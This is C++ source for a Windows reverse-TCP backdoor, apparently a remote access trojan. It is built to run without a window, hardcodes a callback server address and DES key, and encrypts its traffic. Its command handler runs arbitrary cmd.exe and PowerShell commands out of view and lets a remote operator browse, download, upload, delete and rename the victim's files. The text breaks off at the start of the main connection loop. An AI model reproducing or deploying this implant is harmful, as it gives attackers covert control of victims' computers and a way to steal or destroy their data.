// x86_64-w64-mingw32-g++ -o ReverseTCP_DES.exe ReverseTCP_DES.cpp -lws2_32 -static -static-libgcc -static-libstdc++ -O2 -mwindows

#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <stdexcept>
#include <algorithm>
#include <memory>
#include <fstream>
#include <sstream>
#include <array>
#include <windows.h>
#include <shlwapi.h>
#include <filesystem>
#include <iomanip>
#include <random>
#include <chrono>
#include <ctime>
#include <cstdlib>
#include <map>
#include <cstring>
#include <cstdint>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")

const char* SERVER_IP = "192.168.1.107";
const int SERVER_PORT = 1111;
const std::string ENCRYPTION_KEY = "12345678";
const std::string AUTH_ID = "212545dc-2158-44bf-bba5-5bc0a3d41ef9";


namespace tiny_des {

    static const int IP[64] = {
        58, 50, 42, 34, 26, 18, 10, 2,
        60, 52, 44, 36, 28, 20, 12, 4,
        62, 54, 46, 38, 30, 22, 14, 6,
        64, 56, 48, 40, 32, 24, 16, 8,
        57, 49, 41, 33, 25, 17, 9, 1,
        59, 51, 43, 35, 27, 19, 11, 3,
        61, 53, 45, 37, 29, 21, 13, 5,
        63, 55, 47, 39, 31, 23, 15, 7
    };

    static const int FP[64] = {
        40, 8, 48, 16, 56, 24, 64, 32,
        39, 7, 47, 15, 55, 23, 63, 31,
        38, 6, 46, 14, 54, 22, 62, 30,
        37, 5, 45, 13, 53, 21, 61, 29,
        36, 4, 44, 12, 52, 20, 60, 28,
        35, 3, 43, 11, 51, 19, 59, 27,
        34, 2, 42, 10, 50, 18, 58, 26,
        33, 1, 41, 9, 49, 17, 57, 25
    };

    static const int E[48] = {
        32, 1, 2, 3, 4, 5,
        4, 5, 6, 7, 8, 9,
        8, 9, 10, 11, 12, 13,
        12, 13, 14, 15, 16, 17,
        16, 17, 18, 19, 20, 21,
        20, 21, 22, 23, 24, 25,
        24, 25, 26, 27, 28, 29,
        28, 29, 30, 31, 32, 1
    };

    static const int P[32] = {
        16, 7, 20, 21,
        29, 12, 28, 17,
        1, 15, 23, 26,
        5, 18, 31, 10,
        2, 8, 24, 14,
        32, 27, 3, 9,
        19, 13, 30, 6,
        22, 11, 4, 25
    };

    static const int PC1[56] = {
        57, 49, 41, 33, 25, 17, 9,
        1, 58, 50, 42, 34, 26, 18,
        10, 2, 59, 51, 43, 35, 27,
        19, 11, 3, 60, 52, 44, 36,
        63, 55, 47, 39, 31, 23, 15,
        7, 62, 54, 46, 38, 30, 22,
        14, 6, 61, 53, 45, 37, 29,
        21, 13, 5, 28, 20, 12, 4
    };

    static const int PC2[48] = {
        14, 17, 11, 24, 1, 5,
        3, 28, 15, 6, 21, 10,
        23, 19, 12, 4, 26, 8,
        16, 7, 27, 20, 13, 2,
        41, 52, 31, 37, 47, 55,
        30, 40, 51, 45, 33, 48,
        44, 49, 39, 56, 34, 53,
        46, 42, 50, 36, 29, 32
    };

    static const int SHIFTS[16] = { 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 };

    static const int SBOX[8][4][16] = {
        {
            {14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7},
            {0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8},
            {4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0},
            {15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13}
        },
        {
            {15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10},
            {3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5},
            {0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15},
            {13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9}
        },
        {
            {10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8},
            {13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1},
            {13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7},
            {1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12}
        },
        {
            {7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15},
            {13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9},
            {10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4},
            {3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14}
        },
        {
            {2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9},
            {14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6},
            {4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14},
            {11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3}
        },
        {
            {12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11},
            {10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8},
            {9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6},
            {4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13}
        },
        {
            {4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1},
            {13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6},
            {1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2},
            {6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12}
        },
        {
            {13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7},
            {1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2},
            {7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8},
            {2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11}
        }
    };

    static uint64_t permute(uint64_t input, const int* table, int n, int input_bits) {
        uint64_t output = 0;
        for (int i = 0; i < n; ++i) {
            output <<= 1;
            output |= (input >> (input_bits - table[i])) & 1ULL;
        }
        return output;
    }

    static uint32_t permute32(uint32_t input, const int* table, int n, int input_bits) {
        uint32_t output = 0;
        for (int i = 0; i < n; ++i) {
            output <<= 1;
            output |= (input >> (input_bits - table[i])) & 1U;
        }
        return output;
    }

    static void generate_subkeys(const uint8_t* key, uint64_t subkeys[16]) {
        uint64_t key64 = 0;
        for (int i = 0; i < 8; ++i) {
            key64 = (key64 << 8) | key[i];
        }

        uint64_t pc1 = permute(key64, PC1, 56, 64);
        uint32_t c = (uint32_t)((pc1 >> 28) & 0x0FFFFFFF);
        uint32_t d = (uint32_t)(pc1 & 0x0FFFFFFF);

        for (int i = 0; i < 16; ++i) {
            int shift = SHIFTS[i];
            c = ((c << shift) | (c >> (28 - shift))) & 0x0FFFFFFF;
            d = ((d << shift) | (d >> (28 - shift))) & 0x0FFFFFFF;

            uint64_t cd = ((uint64_t)c << 28) | d;
            subkeys[i] = permute(cd, PC2, 48, 56);
        }
    }

    static uint32_t feistel(uint32_t r, uint64_t subkey) {
        uint64_t expanded = 0;
        for (int i = 0; i < 48; ++i) {
            expanded <<= 1;
            expanded |= (r >> (32 - E[i])) & 1ULL;
        }

        uint64_t x = expanded ^ subkey;
        uint32_t s_out = 0;

        for (int i = 0; i < 8; ++i) {
            int chunk = (int)((x >> (42 - i * 6)) & 0x3F);
            int row = ((chunk & 0x20) >> 4) | (chunk & 1);
            int col = (chunk >> 1) & 0x0F;
            s_out = (s_out << 4) | SBOX[i][row][col];
        }

        return permute32(s_out, P, 32, 32);
    }

    static uint64_t des_block_encrypt(uint64_t block, const uint64_t subkeys[16]) {
        uint64_t ip = permute(block, IP, 64, 64);
        uint32_t l = (uint32_t)(ip >> 32);
        uint32_t r = (uint32_t)(ip & 0xFFFFFFFFULL);

        for (int i = 0; i < 16; ++i) {
            uint32_t temp = l;
            l = r;
            r = temp ^ feistel(r, subkeys[i]);
        }

        uint64_t preoutput = ((uint64_t)r << 32) | l;
        return permute(preoutput, FP, 64, 64);
    }

    static uint64_t des_block_decrypt(uint64_t block, const uint64_t subkeys[16]) {
        uint64_t ip = permute(block, IP, 64, 64);
        uint32_t l = (uint32_t)(ip >> 32);
        uint32_t r = (uint32_t)(ip & 0xFFFFFFFFULL);

        for (int i = 15; i >= 0; --i) {
            uint32_t temp = l;
            l = r;
            r = temp ^ feistel(r, subkeys[i]);
        }

        uint64_t preoutput = ((uint64_t)r << 32) | l;
        return permute(preoutput, FP, 64, 64);
    }

    static void des_cbc_encrypt(const uint8_t* key, const uint8_t* iv,
                                const uint8_t* in, uint8_t* out, size_t len) {
        uint64_t subkeys[16];
        generate_subkeys(key, subkeys);

        uint8_t prev[8];
        memcpy(prev, iv, 8);

        for (size_t i = 0; i < len; i += 8) {
            uint64_t block = 0;
            for (int j = 0; j < 8; ++j) {
                uint8_t b = in[i + j] ^ prev[j];
                block = (block << 8) | b;
            }
            uint64_t enc = des_block_encrypt(block, subkeys);
            for (int j = 0; j < 8; ++j) {
                out[i + j] = (uint8_t)(enc >> (56 - j * 8));
            }
            memcpy(prev, out + i, 8);
        }
    }

    static void des_cbc_decrypt(const uint8_t* key, const uint8_t* iv,
                                const uint8_t* in, uint8_t* out, size_t len) {
        uint64_t subkeys[16];
        generate_subkeys(key, subkeys);

        uint8_t prev[8];
        memcpy(prev, iv, 8);

        for (size_t i = 0; i < len; i += 8) {
            uint64_t block = 0;
            for (int j = 0; j < 8; ++j) {
                block = (block << 8) | in[i + j];
            }
            uint64_t dec = des_block_decrypt(block, subkeys);
            for (int j = 0; j < 8; ++j) {
                out[i + j] = (uint8_t)(dec >> (56 - j * 8)) ^ prev[j];
            }
            memcpy(prev, in + i, 8);
        }
    }
}


class Base64 {
private:
    static const std::string BASE64_CHARS;

    static inline bool is_base64(unsigned char c) {
        return (isalnum(c) || (c == '+') || (c == '/'));
    }

public:
    static std::string decode(const std::string& encoded_string) {
        int in_len = (int)encoded_string.size();
        int i = 0;
        int j = 0;
        int in_ = 0;
        unsigned char char_array_4[4], char_array_3[3];
        std::string ret;

        while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
            char_array_4[i++] = encoded_string[in_]; in_++;
            if (i == 4) {
                for (i = 0; i < 4; i++)
                    char_array_4[i] = (unsigned char)BASE64_CHARS.find(char_array_4[i]);

                char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
                char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
                char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

                for (i = 0; (i < 3); i++)
                    ret += char_array_3[i];
                i = 0;
            }
        }

        if (i) {
            for (j = i; j < 4; j++)
                char_array_4[j] = 0;

            for (j = 0; j < 4; j++)
                char_array_4[j] = (unsigned char)BASE64_CHARS.find(char_array_4[j]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
        }

        return ret;
    }

    static std::string encode(const std::string& input) {
        std::string result;
        int i = 0;
        int j = 0;
        unsigned char char_array_3[3];
        unsigned char char_array_4[4];

        for (i = 0; i < (int)input.length(); i++) {
            char_array_3[j++] = input[i];
            if (j == 3) {
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;

                for (j = 0; j < 4; j++)
                    result += BASE64_CHARS[char_array_4[j]];
                j = 0;
            }
        }

        if (j) {
            for (int k = j; k < 3; k++)
                char_array_3[k] = 0;

            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (int k = 0; k < j + 1; k++)
                result += BASE64_CHARS[char_array_4[k]];

            while (j++ < 3)
                result += '=';
        }

        return result;
    }
};

const std::string Base64::BASE64_CHARS =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";


class DESCipherTCP {
private:
    std::vector<uint8_t> key;
    static const int block_size = 8;

    std::vector<uint8_t> pad(const std::vector<uint8_t>& data) {
        size_t pad_len = block_size - (data.size() % block_size);
        std::vector<uint8_t> padded = data;
        padded.insert(padded.end(), pad_len, static_cast<uint8_t>(pad_len));
        return padded;
    }

    std::vector<uint8_t> unpad(const std::vector<uint8_t>& data) {
        if (data.empty()) return data;
        uint8_t pad_len = data.back();
        if (pad_len > block_size || pad_len == 0) return data;
        return std::vector<uint8_t>(data.begin(), data.end() - pad_len);
    }

public:
    DESCipherTCP(const std::string& key_str) {
        key = std::vector<uint8_t>(key_str.begin(), key_str.end());
        if (key.size() != 8) {
            while (key.size() < 8) key.push_back('0');
            key.resize(8);
        }
    }


    std::vector<uint8_t> encrypt(const std::string& raw) {
        std::vector<uint8_t> data(raw.begin(), raw.end());
        data = pad(data);

        uint8_t iv[8];
        for (size_t i = 0; i < 8; ++i) iv[i] = rand() % 256;

        std::vector<uint8_t> ciphertext(data.size());
        tiny_des::des_cbc_encrypt(key.data(), iv, data.data(), ciphertext.data(), data.size());

        std::vector<uint8_t> combined;
        combined.reserve(8 + ciphertext.size());
        combined.insert(combined.end(), iv, iv + 8);
        combined.insert(combined.end(), ciphertext.begin(), ciphertext.end());

        std::string b64 = Base64::encode(std::string((char*)combined.data(), combined.size()));
        return std::vector<uint8_t>(b64.begin(), b64.end());
    }

    std::string decrypt(const std::vector<uint8_t>& enc) {
        std::string b64(enc.begin(), enc.end());
        std::string decoded = Base64::decode(b64);
        if (decoded.size() < 8) return "";

        std::vector<uint8_t> enc_bytes(decoded.begin(), decoded.end());
        uint8_t iv[8];
        memcpy(iv, enc_bytes.data(), 8);

        size_t ct_len = enc_bytes.size() - 8;
        if (ct_len == 0 || ct_len % 8 != 0) return "";

        std::vector<uint8_t> plaintext(ct_len);
        tiny_des::des_cbc_decrypt(key.data(), iv, enc_bytes.data() + 8, plaintext.data(), ct_len);


        if (!plaintext.empty()) {
            uint8_t pad_len = plaintext.back();
            if (pad_len > 0 && pad_len <= block_size && pad_len <= plaintext.size()) {
                plaintext.resize(plaintext.size() - pad_len);
            }
        }

        return std::string(plaintext.begin(), plaintext.end());
    }
};


class Json {
private:
    enum Type { JSON_NULL, JSON_OBJECT, JSON_ARRAY, JSON_STRING, JSON_BOOL, JSON_NUMBER };
    Type type;
    std::map<std::string, Json> object_value;
    std::vector<Json> array_value;
    std::string string_value;
    bool bool_value;
    double number_value;

public:
    Json() : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(std::nullptr_t) : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(const std::string& s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(const char* s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(bool b) : type(JSON_BOOL), bool_value(b), number_value(0) {}
    Json(int n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}
    Json(double n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}

    static Json object() { Json j; j.type = JSON_OBJECT; return j; }
    static Json array() { Json j; j.type = JSON_ARRAY; return j; }

    Json& operator[](const std::string& key) {
        if (type != JSON_OBJECT) { type = JSON_OBJECT; object_value.clear(); }
        return object_value[key];
    }

    void push_back(const Json& val) {
        if (type != JSON_ARRAY) { type = JSON_ARRAY; array_value.clear(); }
        array_value.push_back(val);
    }

    std::string dump(int indent = 0) const {
        if (type == JSON_NULL) return "null";
        if (type == JSON_BOOL) return bool_value ? "true" : "false";
        if (type == JSON_STRING) return "\"" + escape(string_value) + "\"";
        if (type == JSON_NUMBER) {
            char buf[64];
            if (number_value == (int)number_value) snprintf(buf, sizeof(buf), "%d", (int)number_value);
            else snprintf(buf, sizeof(buf), "%g", number_value);
            return std::string(buf);
        }
        if (type == JSON_ARRAY) {
            std::string result = "[";
            for (size_t i = 0; i < array_value.size(); i++) {
                if (i > 0) result += ",";
                if (indent >= 0) result += "\n" + std::string(indent + 2, ' ');
                result += array_value[i].dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !array_value.empty()) result += "\n" + std::string(indent, ' ');
            result += "]";
            return result;
        }
        if (type == JSON_OBJECT) {
            std::string result = "{";
            bool first = true;
            for (const auto& pair : object_value) {
                if (!first) result += ",";
                first = false;
                if (indent >= 0) result += "\n" + std::string(indent + 2, ' ');
                result += "\"" + escape(pair.first) + "\":" + (indent >= 0 ? " " : "");
                result += pair.second.dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !object_value.empty()) result += "\n" + std::string(indent, ' ');
            result += "}";
            return result;
        }
        return "null";
    }

private:
    static std::string escape(const std::string& s) {
        std::string result;
        for (char c : s) {
            if (c == '"') result += "\\\"";
            else if (c == '\\') result += "\\\\";
            else if (c == '\b') result += "\\b";
            else if (c == '\f') result += "\\f";
            else if (c == '\n') result += "\\n";
            else if (c == '\r') result += "\\r";
            else if (c == '\t') result += "\\t";
            else if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); result += buf; }
            else result += c;
        }
        return result;
    }
};


void send_data(SOCKET sock, const std::vector<uint8_t>& data) {
    uint32_t length = static_cast<uint32_t>(data.size());
    std::vector<uint8_t> header(4);
    header[0] = (length >> 24) & 0xFF;
    header[1] = (length >> 16) & 0xFF;
    header[2] = (length >> 8) & 0xFF;
    header[3] = length & 0xFF;
    send(sock, reinterpret_cast<const char*>(header.data()), 4, 0);
    send(sock, reinterpret_cast<const char*>(data.data()), data.size(), 0);
}

std::vector<uint8_t> recv_all(SOCKET sock, size_t n) {
    std::vector<uint8_t> data(n);
    size_t received = 0;
    while (received < n) {
        int result = recv(sock, reinterpret_cast<char*>(&data[received]), (int)(n - received), 0);
        if (result <= 0) throw std::runtime_error("Connection closed");
        received += result;
    }
    return data;
}

std::vector<uint8_t> recv_data(SOCKET sock) {
    auto raw_length = recv_all(sock, 4);
    uint32_t length = (raw_length[0] << 24) | (raw_length[1] << 16) | (raw_length[2] << 8) | raw_length[3];
    return recv_all(sock, length);
}

std::vector<uint8_t> string_to_vector(const std::string& str) {
    return std::vector<uint8_t>(str.begin(), str.end());
}


std::string run_cmd_command(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    std::string full_cmd = "cmd.exe /c " + cmd;
    std::vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] CMD execution error: " + std::to_string(error);
    }

    std::string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    std::string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != std::string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + std::to_string(exitCode) + "]";
    return output.empty() ? "[+] Command executed (no output)" : output;
}

std::string run_powershell_command(const std::string& ps_cmd) {
    std::string escaped_cmd;
    for (char c : ps_cmd) {
        if (c == '"') escaped_cmd += "\\\"";
        else escaped_cmd += c;
    }

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    std::string full_cmd = "powershell.exe -NoProfile -NonInteractive -Command " + escaped_cmd;
    std::vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] PowerShell execution error: " + std::to_string(error);
    }

    std::string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    std::string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != std::string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + std::to_string(exitCode) + "]";
    return output.empty() ? "[+] PowerShell command executed (no output)" : output;
}

Json browse_directory(const std::string& path) {
    Json result = Json::object();
    try {
        std::string actual_path = path;
        if (actual_path.find('~') == 0) {
            char* home = getenv("USERPROFILE");
            if (home) actual_path = std::string(home) + actual_path.substr(1);
        }

        if (!std::filesystem::exists(actual_path)) {
            result["success"] = false;
            result["error"] = "Path does not exist: " + actual_path;
            result["current_path"] = actual_path;
            result["parent_path"] = Json(nullptr);
            result["items"] = Json::array();
            return result;
        }

        Json items = Json::array();
        for (const auto& entry : std::filesystem::directory_iterator(actual_path)) {
            try {
                Json item = Json::object();
                item["name"] = entry.path().filename().string();
                item["type"] = entry.is_directory() ? "directory" : "file";
                item["size"] = entry.is_directory() ? 0 : (double)entry.file_size();

                auto ftime = entry.last_write_time();
                auto time_t = std::chrono::system_clock::to_time_t(
                    std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                        ftime - std::filesystem::file_time_type::clock::now() +
                        std::chrono::system_clock::now()));
                std::stringstream ss;
                ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                item["modified_time"] = ss.str();

                items.push_back(item);
            } catch (const std::exception&) {
                continue;
            }
        }

        result["success"] = true;
        result["current_path"] = actual_path;

        std::filesystem::path parent = std::filesystem::path(actual_path).parent_path();
        if (actual_path.size() >= 2 && actual_path[1] == ':' && actual_path.size() == 3 && actual_path[2] == '\\') {
            result["parent_path"] = Json(nullptr);
        } else if (parent.empty()) {
            result["parent_path"] = Json(nullptr);
        } else {
            result["parent_path"] = parent.string();
        }
        result["items"] = items;
    } catch (const std::exception& e) {
        result["success"] = false;
        result["error"] = e.what();
        result["current_path"] = path;
        result["parent_path"] = Json(nullptr);
        result["items"] = Json::array();
    }
    return result;
}

std::string download_file(const std::string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) return "ERROR: File not found: " + filepath;
        if (std::filesystem::is_directory(filepath)) return "ERROR: Cannot download directory: " + filepath;

        std::ifstream file(filepath, std::ios::binary);
        if (!file) return "ERROR: Cannot open file: " + filepath;

        std::vector<unsigned char> file_data((std::istreambuf_iterator<char>(file)),
                                             std::istreambuf_iterator<char>());
        file.close();

        std::string filename = std::filesystem::path(filepath).filename().string();
        size_t filesize = file_data.size();
        std::string encoded = Base64::encode(std::string((char*)file_data.data(), file_data.size()));

        return "file-data:" + filename + "|" + std::to_string(filesize) + "|" + encoded;
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}

std::string upload_file(const std::string& filepath, const std::string& filedata_b64) {
    try {
        std::string decoded_data = Base64::decode(filedata_b64);
        std::vector<unsigned char> file_data(decoded_data.begin(), decoded_data.end());

        std::filesystem::path path_obj(filepath);
        std::filesystem::create_directories(path_obj.parent_path());

        std::ofstream file(filepath, std::ios::binary);
        if (!file) return "ERROR: Cannot write file: " + filepath;
        file.write(reinterpret_cast<const char*>(file_data.data()), file_data.size());
        file.close();

        return "SUCCESS: File uploaded to " + filepath;
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}

std::string delete_file(const std::string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) return "ERROR: Path does not exist: " + filepath;
        if (std::filesystem::is_directory(filepath)) {
            std::filesystem::remove_all(filepath);
            return "SUCCESS: Deleted directory " + filepath;
        } else {
            std::filesystem::remove(filepath);
            return "SUCCESS: Deleted file " + filepath;
        }
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}

std::string rename_file(const std::string& old_path, const std::string& new_path) {
    try {
        if (!std::filesystem::exists(old_path)) return "ERROR: Source path does not exist: " + old_path;
        std::filesystem::rename(old_path, new_path);
        return "SUCCESS: Renamed to " + new_path;
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}

std::vector<uint8_t> execute_command(const std::string& command) {
    std::string trimmed = command;
    size_t start = trimmed.find_first_not_of(" \t\r\n");
    if (start != std::string::npos) {
        size_t end = trimmed.find_last_not_of(" \t\r\n");
        trimmed = trimmed.substr(start, end - start + 1);
    }
    if (trimmed.empty()) return string_to_vector("[no command]");

    if (trimmed.find("browse:") == 0) {
        std::string browse_path = trimmed.substr(7);
        while (!browse_path.empty() && browse_path.front() == ' ') browse_path.erase(0, 1);
        if (browse_path.empty()) browse_path = std::filesystem::current_path().string();
        Json dir_data = browse_directory(browse_path);
        std::string base64_data = Base64::encode(dir_data.dump());
        return string_to_vector("browse-data-" + base64_data);
    }

    if (trimmed.find("download-file:") == 0) {
        std::string filepath = trimmed.substr(14);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return string_to_vector(download_file(filepath));
    }

    if (trimmed.find("upload-file:") == 0) {
        std::string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != std::string::npos) {
            std::string filepath = rest.substr(0, sep_pos);
            std::string filedata_b64 = rest.substr(sep_pos + 1);
            return string_to_vector(upload_file(filepath, filedata_b64));
        } else {
            return string_to_vector("ERROR: Invalid upload format");
        }
    }

    if (trimmed.find("delete-file:") == 0) {
        std::string filepath = trimmed.substr(12);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return string_to_vector(delete_file(filepath));
    }

    if (trimmed.find("rename-file:") == 0) {
        std::string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != std::string::npos) {
            std::string old_path = rest.substr(0, sep_pos);
            std::string new_path = rest.substr(sep_pos + 1);
            return string_to_vector(rename_file(old_path, new_path));
        } else {
            return string_to_vector("ERROR: Invalid rename format");
        }
    }

    if (trimmed.find("ping") == 0) {
        return string_to_vector("pong");
    }

    if (trimmed.find("exit") == 0 || trimmed.find("quit") == 0) {
        return string_to_vector("exit");
    }

    std::string upper_cmd = trimmed;
    transform(upper_cmd.begin(), upper_cmd.end(), upper_cmd.begin(), ::toupper);

    if (upper_cmd.length() >= 3 && upper_cmd.substr(0, 3) == "EP ") {
        return string_to_vector(run_powershell_command(trimmed.substr(3)));
    }
    if (upper_cmd.length() >= 2 && upper_cmd.substr(0, 2) == "EP") {
        return string_to_vector(run_powershell_command(trimmed.substr(2)));
    }
    return string_to_vector(run_cmd_command(trimmed));
}


int main() {
    srand(static_cast<unsigned>(time(nullptr)));

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    DESCipherTCP cipher(ENCRYPTION_KEY);

    while (true) {
